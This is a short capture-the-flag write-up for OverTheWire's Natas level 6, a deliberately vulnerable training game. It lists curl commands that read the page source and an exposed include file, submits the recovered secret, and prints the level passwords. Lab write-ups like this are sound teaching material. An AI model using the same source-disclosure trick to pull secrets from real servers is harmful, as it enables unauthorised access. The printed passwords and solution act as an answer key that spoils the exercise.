# Natas Level 06 to 07

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 6 -> 7 |
| Status | Complete |

## Objective

Find the secret value required by the form.

## Given Access

User: `natas6`

Password:

```text
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Method

View the source, follow the included file path, then submit the recovered secret using POST.

## Commands

```bash
curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/index-source.html
curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secret.inc
curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned \
  -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit' \
  http://natas6.natas.labs.overthewire.org/
```

## Result

Password for `natas7`:

```text
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

## Lesson

Source disclosure plus readable include files can reveal server-side secrets.

## References

- https://overthewire.org/wargames/natas/
